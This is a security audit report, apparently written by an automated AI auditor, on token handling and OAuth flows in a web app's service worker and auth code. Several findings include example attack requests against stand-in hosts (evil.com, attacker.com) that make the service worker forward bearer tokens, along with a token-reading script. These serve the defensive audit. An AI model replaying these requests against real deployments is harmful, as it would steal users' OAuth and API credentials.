# Security Audit: Authentication & Token Management

**Auditor**: Claude Opus 4.6 (automated code audit)
**Date**: 2026-05-07
**Scope**: OAuth flows, Service Worker token management, SW bridge, auth callback, config, ProviderPicker
**Threat model reference**: `docs/security/threat-model.md` (T1-T12)

---

## Finding 1: Vertex AI LLM relay allows SSRF to arbitrary HTTPS hosts

| Field | Value |
|-------|-------|
| **Severity** | Critical |
| **Threat model ref** | T4 (confirmed, variant) |
| **File:Line** | `packages/app/public/sw.js:222-225` |

**Description**: The `vertex` case in `handleLLMRelay()` constructs the target URL as `https://${remainingPath}`, where `remainingPath` is taken directly from the request URL path. Unlike the `custom` case (which the threat model already flags), the `vertex` case is equally dangerous but was not identified in T4.

An attacker (via XSS or a malicious browser extension) can issue a fetch to `/_aegis/llm/vertex/attacker.com/exfil` and the SW will forward the request to `https://attacker.com/exfil` with the Google OAuth bearer token injected in the `Authorization` header.

**Attack scenario**:
1. Attacker achieves XSS (e.g., via T1 or T11)
2. Attacker fetches `/_aegis/llm/vertex/evil.com/steal`
3. SW rewrites to `https://evil.com/steal` and injects `Authorization: Bearer <google_token>`
4. Attacker receives the victim's Google Cloud Platform OAuth token

**Recommended fix**: Validate that `targetUrl` matches an expected Vertex AI host pattern (e.g., `*-aiplatform.googleapis.com`). Reject requests where the reconstructed host does not match.

---

## Finding 2: Custom LLM relay forwards auth token to arbitrary URLs

| Field | Value |
|-------|-------|
| **Severity** | Critical |
| **Threat model ref** | T4 (confirmed) |
| **File:Line** | `packages/app/public/sw.js:238-241` |

**Description**: The `custom` provider case uses `decodeURIComponent(remainingPath)` as the target URL with no validation. If a `custom` auth token is stored, it is sent to whatever URL the caller specifies. This is exactly T4 as documented in the threat model, confirmed present in code.

**Attack scenario**:
1. User configures a custom LLM endpoint and stores an API key
2. Attacker (XSS) fetches `/_aegis/llm/custom/https%3A%2F%2Fattacker.com%2Fsteal`
3. SW sends the custom API key to `https://attacker.com/steal`

**Recommended fix**: Store the user-configured custom endpoint URL at registration time. In the relay, compare the decoded URL against the stored allowlist. Reject requests to non-matching hosts.

---

## Finding 3: SW message handler accepts SET_TOKEN with arbitrary provider keys

| Field | Value |
|-------|-------|
| **Severity** | High |
| **Threat model ref** | T8 (escalation) |
| **File:Line** | `packages/app/public/sw.js:120-122` |

**Description**: The SW `SET_TOKEN` handler calls `tokens.set(data.provider, data.token)` without validating that `data.provider` is one of the four known providers (`github`, `atlassian`, `redhat-sso`, `google`). Any same-origin script can post a message with an arbitrary provider string, e.g., `anthropic`, `openai`, or `custom`, storing attacker-controlled tokens.

Combined with Finding 1 or 2, this means an XSS attack can:
1. Store a tracking token under the `custom` provider key
2. Then trigger the custom relay to send that token to an attacker-controlled URL, confirming token injection works
3. More dangerously, store a malicious token under `github` or `atlassian`, causing the SW to inject that token into legitimate API requests, enabling token fixation (the attacker's token is used for the victim's API calls)

**Recommended fix**: Validate `data.provider` against a hardcoded allowlist of known provider strings before storing. Also validate the shape of `data.token` (must have `accessToken` string, `expiresAt` number).

---

## Finding 4: No origin validation on SW postMessage handler

| Field | Value |
|-------|-------|
| **Severity** | Medium |
| **Threat model ref** | NEW |
| **File:Line** | `packages/app/public/sw.js:115-146` |

**Description**: The Service Worker `message` event handler does not validate the source of incoming messages. While SWs only receive messages from pages within their scope (same origin), this means any page or iframe on the same origin can send `SET_TOKEN` or `CLEAR_TOKEN` messages. On GitHub Pages, the origin is `<user>.github.io`, and if any other GitHub Pages project on the same user account has an XSS vulnerability, it shares the same origin and can manipulate the SW's token store.

**Attack scenario**:
1. Aegis is served from `myorg.github.io/aegis/`
2. Another project at `myorg.github.io/other-project/` has an XSS vulnerability
3. Attacker injects script in the other project, which can postMessage to the Aegis SW
4. Attacker clears all tokens (DoS) or injects malicious tokens (fixation)

**Recommended fix**: Consider hosting on a dedicated domain or subdomain. If GitHub Pages is required, validate `event.source` and consider adding a nonce or shared secret to the message protocol that is established at SW registration time.

---

## Finding 5: PKCE code verifier has modular bias in random generation

| Field | Value |
|-------|-------|
| **Severity** | Low |
| **Threat model ref** | T12 (related) |
| **File:Line** | `packages/app/src/lib/auth/pkce.ts:25-27` |

**Description**: The verifier generation uses `byte % VERIFIER_CHARSET.length` where the charset has 66 characters. Since `256 % 66 = 58`, the first 58 characters of the charset are slightly more likely than the last 8. This introduces a small modular bias.

The bias is approximately `(256 mod 66) / 256 = 0.227`, meaning characters at indices 0-57 each have probability `4/256 = 1.5625%` while characters at indices 58-65 have `3/256 = 1.1719%`. For a 64-character verifier, this reduces entropy from the ideal ~384 bits by roughly 1-2 bits, leaving well above the 256-bit minimum for PKCE security. The practical impact is negligible.

**Recommended fix**: Use rejection sampling: discard random bytes >= `252` (the largest multiple of 66 below 256) and resample. Or use `crypto.getRandomValues` to generate values within range directly.

---

## Finding 6: ProviderPicker casts LLM provider IDs to AuthProvider type unsafely

| Field | Value |
|-------|-------|
| **Severity** | Medium |
| **Threat model ref** | T8 (confirmed) |
| **File:Line** | `packages/app/src/components/chat/ProviderPicker.tsx:202-206` |

**Description**: When saving an LLM provider API key, the code casts `selected.id` (which is `'anthropic'`, `'openai'`, or `'custom'`) to `'github'`:

```typescript
await sendTokenToSW(selected.id as 'github', {
  accessToken: apiKey,
  expiresAt: Date.now() + 365 * 24 * 60 * 60 * 1000,
  provider: selected.id as 'github',
});
```

This sends the token to the SW with a `provider` field set to, e.g., `'anthropic'` at runtime (the cast is compile-time only), but the type system believes it is `'github'`. The SW stores it under the actual runtime string (e.g., `tokens.set('anthropic', ...)`). This works by accident because the SW is untyped JavaScript.

However, this creates two concrete risks:
1. **Type system bypass**: Any future refactoring that adds provider validation based on the `AuthProvider` type will miss LLM provider tokens entirely, potentially breaking the flow silently.
2. **Token namespace pollution**: The `tokens` Map now contains keys not in the `AuthProvider` union, which could collide with future provider names.

**Recommended fix**: Extend the type system with a `TokenProvider` type that is `AuthProvider | 'anthropic' | 'openai' | 'custom'`. Update `sendTokenToSW` and the SW handler to accept this broader type.

---

## Finding 7: Tokens held in AuthManager state in main thread memory

| Field | Value |
|-------|-------|
| **Severity** | Medium |
| **Threat model ref** | T12 (related), NEW |
| **File:Line** | `packages/app/src/lib/auth/manager.ts:108-109` |

**Description**: The `setToken` method stores the full `TokenSet` (including `accessToken` and `refreshToken`) in `this.state.tokens[provider]`. The design documentation and code comments claim "Actual tokens live ONLY in the Service Worker's memory Map", but this is incorrect -- the `AuthManager` singleton retains a copy of every token in main-thread memory.

This means an XSS attack can read tokens from the `authManager` singleton:
```javascript
// In a compromised page context:
import { authManager } from './lib/auth/manager';
const state = authManager.getState();
const githubToken = state.tokens.github?.accessToken;
```

Even if the attacker cannot import the module directly, the singleton is reachable via the module graph or by traversing React internals/Zustand stores.

**Attack scenario**:
1. Attacker achieves XSS (via T1 or T11)
2. Attacker accesses `authManager.getState().tokens` to read all active OAuth tokens
3. Attacker exfiltrates tokens to their server

**Recommended fix**: After syncing the token to the SW, clear the `accessToken` and `refreshToken` fields from the in-memory `AuthManager` state. Only retain metadata (provider, expiresAt, hasRefreshToken). The `requireAuth` method should query the SW for the actual token when needed, rather than reading from local state.

---

## Finding 8: OIDC discovery document endpoints not validated against issuer

| Field | Value |
|-------|-------|
| **Severity** | Medium |
| **Threat model ref** | NEW |
| **File:Line** | `packages/app/src/lib/auth/redhat-sso.ts:44-54` |

**Description**: The `discoverOIDCConfig` function fetches the OIDC discovery document and checks that `authorization_endpoint` and `token_endpoint` exist, but does not validate that these URLs belong to the same origin as the `issuerUrl`. Per the OIDC Discovery specification (section 4.3), the `issuer` value in the discovery document MUST exactly match the `issuerUrl` used to fetch it.

If an attacker can intercept or MITM the `.well-known/openid-configuration` fetch (e.g., via a malicious Service Worker in a different scope, or DNS spoofing), they could return a discovery document with a `token_endpoint` pointing to their own server. The auth code and PKCE verifier would then be sent to the attacker's endpoint.

**Attack scenario**:
1. Attacker compromises DNS or network to redirect `sso.redhat.com` discovery fetch
2. Returns a document with `token_endpoint: "https://attacker.com/token"`
3. User's authorization code + PKCE verifier sent to attacker
4. Attacker can exchange the code for tokens at the real IdP (within PKCE window)

**Recommended fix**: Validate that `doc.issuer === issuerUrl` and that both `authorization_endpoint` and `token_endpoint` have origins matching the issuer. Also validate the `token_endpoint` uses HTTPS.

---

## Finding 9: OIDC discovery cache never expires

| Field | Value |
|-------|-------|
| **Severity** | Low |
| **Threat model ref** | NEW |
| **File:Line** | `packages/app/src/lib/auth/redhat-sso.ts:22` |

**Description**: The `discoveryCache` is a `Map<string, OIDCDiscoveryDocument>` with no TTL or expiration mechanism. Once fetched, the discovery document is cached indefinitely in memory. If the IdP rotates endpoints (e.g., during migration), the app will use stale endpoints until the page is fully reloaded.

This is a minor operational issue, not a direct security vulnerability, but could cause auth failures that are difficult to debug.

**Recommended fix**: Add a TTL (e.g., 1 hour) to the discovery cache. Store a timestamp alongside the document and re-fetch when expired.

---

## Finding 10: Auth callback does not validate provider parameter against allowlist

| Field | Value |
|-------|-------|
| **Severity** | Medium |
| **Threat model ref** | T2 (related) |
| **File:Line** | `packages/app/src/routes/auth.callback.tsx:26` |

**Description**: The auth callback route reads `provider` from the query string and casts it directly to `AuthProvider | null`:

```typescript
const provider = params.get('provider') as AuthProvider | null
```

While the `switch` statement on line 38-53 does handle the `default` case by throwing, the type cast means TypeScript does not enforce the check. The `provider` variable is used on line 55 with a non-null assertion (`provider!`) even though the `default` case threw -- if the switch is ever refactored, this could lead to calling `authManager.setToken` with an unsanitized provider string.

Additionally, the `error_description` from each OAuth provider's callback parameters is displayed to the user on line 94 via `{errorMessage}`. While React escapes JSX interpolation (preventing XSS), the error message from the URL could contain misleading social-engineering text. The URL `?provider=github&error=access_denied&error_description=Contact+admin@evil.com+to+fix` would show "Contact admin@evil.com to fix" to the user.

**Recommended fix**: 
1. Validate `provider` against the explicit list `['github', 'atlassian', 'redhat-sso', 'google']` before proceeding.
2. Do not display raw `error_description` from URL parameters. Use a generic error message and log the details to the console.

---

## Finding 11: Token expiry not checked in SW before LLM relay token injection

| Field | Value |
|-------|-------|
| **Severity** | Low |
| **Threat model ref** | NEW |
| **File:Line** | `packages/app/public/sw.js:253-260` |

**Description**: The `handleLLMRelay` function retrieves a token and injects it into the request headers, but unlike `handleApiRequest` (which checks `isTokenExpired` on line 173), it does not check whether the token has expired before injecting it. This means expired tokens will be sent to LLM provider APIs.

For OAuth tokens (Vertex/Google), this will result in 401 errors that the user sees as vague failures. For API keys (Anthropic/OpenAI), the expiry is set to 1 year in the future (line 204 of ProviderPicker.tsx), so this is unlikely to trigger. But the inconsistency creates a gap: if a Google OAuth token expires, the regular API path (`handleApiRequest`) will correctly notify the client and remove the token, but the LLM relay will silently send the expired token.

**Recommended fix**: Add `isTokenExpired(token)` check in `handleLLMRelay` before injecting the token, matching the pattern in `handleApiRequest`.

---

## Finding 12: SW token loss on update/restart with no recovery mechanism

| Field | Value |
|-------|-------|
| **Severity** | Medium |
| **Threat model ref** | NEW |
| **File:Line** | `packages/app/public/sw.js:44`, `packages/app/src/lib/auth/manager.ts:339-361` |

**Description**: Tokens are stored in the SW's in-memory `Map`. When the SW updates (new version deployed) or is terminated by the browser (idle timeout), all tokens are lost. The `skipWaiting()` on line 54 forces immediate activation of new SWs, which kills the old one and its token map.

The `AuthManager.restoreTokenMetadata()` restores only metadata (with empty `accessToken` fields) from `localStorage`. There is no mechanism to re-sync actual tokens from main-thread memory back to a new SW. The `AuthManager` does hold tokens in memory (Finding 7), but there is no code that detects SW restarts and re-sends stored tokens.

This means:
- After a deployment, all users silently lose auth until they re-authenticate
- If the browser reclaims the SW, the next API call fails with a missing `Authorization` header
- The UI may show the user as "connected" (metadata says so) while the SW has no tokens

**Recommended fix**: Listen for the `controllerchange` event on `navigator.serviceWorker` and re-send all tokens from `AuthManager.state.tokens` to the new SW. Alternatively, explore using `IndexedDB` from within the SW to persist tokens (encrypted) across restarts.

---

## Finding 13: GitHub token exchange endpoint CORS limitation forces proxy with token exposure

| Field | Value |
|-------|-------|
| **Severity** | Medium |
| **Threat model ref** | NEW |
| **File:Line** | `packages/app/src/lib/auth/github.ts:8-13, 93-105` |

**Description**: The code comments acknowledge that GitHub's token exchange endpoint does not support CORS. This means the `fetch()` on line 93 will fail in production. The code notes that a "CORS proxy" or "serverless function" is needed.

If a CORS proxy is used, the authorization code and PKCE verifier pass through it. If the proxy is not properly secured, an operator of the proxy (or an attacker who compromises it) can intercept the code+verifier and exchange them for a token. This undermines the PKCE security model, which assumes the token exchange is a direct client-to-IdP call.

**Recommended fix**: When implementing the proxy, ensure it is a minimal, auditable pass-through with no logging of request bodies. Prefer a serverless function (e.g., Cloudflare Worker) deployed by the same team. Document the proxy as a trusted component in the threat model.

---

## Finding 14: OAuth callback race condition - useEffect runs token exchange without guard

| Field | Value |
|-------|-------|
| **Severity** | Low |
| **Threat model ref** | T2 (related) |
| **File:Line** | `packages/app/src/routes/auth.callback.tsx:22-70` |

**Description**: The `useEffect` in the auth callback component has `[navigate]` as its dependency. In React 18 Strict Mode (development), effects run twice. This means `exchangeToken()` could be called twice, each attempting to exchange the same authorization code. The first call will consume the PKCE verifier from `sessionStorage` (the handler removes it on line 88-89 in github.ts), so the second call will fail with "PKCE verifier not found in session".

While this only occurs in development (Strict Mode), the error is misleading and could mask real bugs. More importantly, if the component re-renders for any reason before the first exchange completes, a second exchange attempt will race with the first.

**Recommended fix**: Add an `AbortController` or a ref guard (`const exchanged = useRef(false)`) to prevent duplicate exchanges. Consume and clear the sessionStorage values atomically at the start of the effect.

---

## Finding 15: Test connection for API key providers performs no actual validation

| Field | Value |
|-------|-------|
| **Severity** | Low |
| **Threat model ref** | NEW |
| **File:Line** | `packages/app/src/components/chat/ProviderPicker.tsx:182-188` |

**Description**: The "Test Connection" button for Anthropic and OpenAI providers only checks that the API key is non-empty (`if (!apiKey.trim())`), then immediately reports success. It does not make any API call to verify the key is valid. The UI shows a green checkmark saying "Connected" even if the key is invalid, expired, or belongs to a different account.

This is a UX issue that could lead users to believe their setup is correct when it is not. It could also encourage users to enter placeholder/test values, leaving them confused later.

**Recommended fix**: Make a lightweight API call to verify the key (e.g., `GET /v1/models` for both Anthropic and OpenAI) before reporting success.

---

## Summary

| # | Severity | Ref | Title |
|---|----------|-----|-------|
| 1 | Critical | T4 | Vertex relay SSRF leaks Google OAuth token |
| 2 | Critical | T4 | Custom relay forwards tokens to arbitrary URLs |
| 3 | High | T8+ | SW accepts SET_TOKEN for arbitrary provider keys |
| 4 | Medium | NEW | No origin validation on SW message handler |
| 5 | Low | T12 | PKCE verifier modular bias (negligible impact) |
| 6 | Medium | T8 | ProviderPicker unsafe type cast for token storage |
| 7 | Medium | NEW | Tokens retained in main-thread memory despite docs |
| 8 | Medium | NEW | OIDC discovery endpoints not validated against issuer |
| 9 | Low | NEW | OIDC discovery cache never expires |
| 10 | Medium | T2 | Auth callback does not validate provider parameter |
| 11 | Low | NEW | LLM relay skips token expiry check |
| 12 | Medium | NEW | SW token loss on update with no recovery |
| 13 | Medium | NEW | GitHub CORS proxy will expose code+verifier |
| 14 | Low | T2 | Auth callback useEffect race in Strict Mode |
| 15 | Low | NEW | Test connection does not validate API keys |

**Priority recommendations**:
- **P0** (block deployment): Fix Findings 1, 2, 3
- **P1** (fix before production): Fix Findings 7, 8, 12
- **P2** (fix in next iteration): Fix Findings 4, 6, 10, 13
- **P3** (track): Findings 5, 9, 11, 14, 15
